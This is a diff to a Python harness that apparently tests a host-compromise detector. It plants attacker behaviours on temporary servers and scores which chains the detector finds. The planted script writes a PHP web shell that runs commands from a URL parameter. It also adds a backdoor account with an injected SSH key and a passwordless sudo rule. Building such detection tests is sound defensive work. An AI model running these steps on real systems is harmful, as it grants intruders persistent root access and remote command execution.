@@ -14,10 +14,11 @@ from __future__ import annotations
 
 import argparse
 import asyncio
+import json
 import sys
 import tempfile
 import time
-from dataclasses import dataclass, field
+from dataclasses import asdict, dataclass, field
 from pathlib import Path
 
 import asyncssh
@@ -128,6 +129,10 @@ root=/usr/share/nginx/html
 [ -d /etc/nginx/sites-enabled ] && root=/var/www/html
 printf '%s\n' '<?php echo shell_exec($_GET["c"] ?? "id"); ?>' > "$root/cc-shell.php" \
     || fail webshell
+# Owned by the web account, as a file a web shell writes is: the chain
+# follows that account from the script to what it starts.
+chown "$(id -u apache >/dev/null 2>&1 && echo apache || echo www-data)" "$root/cc-shell.php" \
+    || fail webshell-owner
 for c in id 'uname%20-a' 'sh%20-c%20id'; do
     curl -s -o /dev/null "http://127.0.0.1/cc-shell.php?c=$c" || fail webshell-request
 done
@@ -188,6 +193,16 @@ for n in $(seq 1 150); do
         | runuser -u www-data -- /usr/sbin/sendmail "r$n@d$((n % 60)).invalid" || fail mail
 done
 sleep 30
+# --- Chains (2.10) ---
+# A new account, given sudo; the proof then logs in as it (after this
+# script), completing the new-account-escalated-used chain.
+useradd -m -s /bin/bash ccadmin || fail chain-account
+install -d -m 700 -o ccadmin -g ccadmin /home/ccadmin/.ssh
+echo '{admin_key} cc-proof-admin' > /home/ccadmin/.ssh/authorized_keys || fail chain-key
+chown ccadmin:ccadmin /home/ccadmin/.ssh/authorized_keys
+chmod 600 /home/ccadmin/.ssh/authorized_keys
+echo 'ccadmin ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/cc-admin || fail chain-sudo
+chmod 440 /etc/sudoers.d/cc-admin
 # --- Containers (2.9) ---
 # A privileged container mounting the host's root: Docker on Ubuntu,
 # Podman on Rocky (both set up by the read-only proof's setup).
@@ -307,10 +322,16 @@ def expectations(root_fingerprint: str) -> list[Expected]:
     ]
 
 
+# Chains the behaviours must complete (the correlation bonus applies).
+EXPECTED_CHAINS = ("new-account-escalated-used", "web-shell-used")
+
+
 @dataclass
 class Result:
     distro: str
     passed: bool = False
+    probability: float | None = None
+    band: str | None = None
     found: list[str] = field(default_factory=list)
     missing: list[str] = field(default_factory=list)
     other: list[str] = field(default_factory=list)  # findings no behaviour explains
@@ -371,6 +392,7 @@ async def detect(
     root_key = asyncssh.generate_private_key("ssh-ed25519")
     scanner_key = asyncssh.generate_private_key("ssh-ed25519")
     backdoor = asyncssh.generate_private_key("ssh-ed25519")
+    admin = asyncssh.generate_private_key("ssh-ed25519")
     scanner_key_file = work / f"{distro}-scanner"
     scanner_key.write_private_key(scanner_key_file)
     label = proof.run_label(distro)
@@ -424,14 +446,30 @@ async def detect(
             )
             await collect(home, config, scanner, known)
             print(f"{distro}: baseline collected; planting the behaviours")
-            attacks = ATTACKS.replace("{root_key}", backdoor.export_public_key().decode().strip())
+            attacks = ATTACKS.replace(
+                "{root_key}", backdoor.export_public_key().decode().strip()
+            ).replace("{admin_key}", admin.export_public_key().decode().strip())
             # On standard input, not as `bash -c <script>`: otherwise the
             # script's own shell would carry every pattern its pgrep checks
             # look for, and they would always succeed.
-            done = await conn.run("bash -s", input=attacks, timeout=300)
+            done = await conn.run("bash -s", input=attacks, timeout=900)
             for line in done.stderr.splitlines():
                 if line.startswith("ATTACK FAILED"):
                     result.missing.append(line)
+            # The new account, given sudo above, logging in: the chain's last step.
+            try:
+                async with asyncssh.connect(
+                    address,
+                    username="ccadmin",
+                    client_keys=[admin],
+                    known_hosts=str(known),
+                    agent_path=None,
+                    gss_host=None,
+                    config=None,
+                ) as admin_conn:
+                    await admin_conn.run("true", timeout=60)
+            except Exception as exc:
+                result.missing.append(f"ATTACK FAILED: chain-login: {exc}")
         await collect(home, config, scanner, known)
         store = Store(database_file(home))
         try:
@@ -467,6 +505,14 @@ async def detect(
         )
         result.found, result.other = found, other
         result.missing += missing
+        chains = {c["chain"]: c for c in assessment["score"].get("chains") or []}
+        for chain in EXPECTED_CHAINS:
+            if chain in chains:
+                result.found.append(f"chain {chain}: for {chains[chain]['account']}")
+            else:
+                result.missing.append(f"chain {chain}: not found")
+        result.probability = assessment["score"].get("probability")
+        result.band = assessment["score"].get("band")
         result.passed = not result.missing
     except Exception as exc:
         result.error = f"{type(exc).__name__}: {exc}"
@@ -506,6 +552,7 @@ async def main() -> int:
     )
     parser.add_argument("--region", default="us-sea")
     parser.add_argument("--keep", action="store_true", help="don't delete the servers")
+    parser.add_argument("--json", type=Path, help="also write the results here (calibrate.py)")
     parser.add_argument(
         "--golden",
         metavar="DIR",
@@ -529,6 +576,8 @@ async def main() -> int:
     finally:
         if not args.keep:
             await asyncio.to_thread(proof.sweep_run, api)
+    if args.json:
+        args.json.write_text(json.dumps([asdict(r) for r in results], default=str, indent=1))
     return 0 if report(list(results)) else 1
 
 
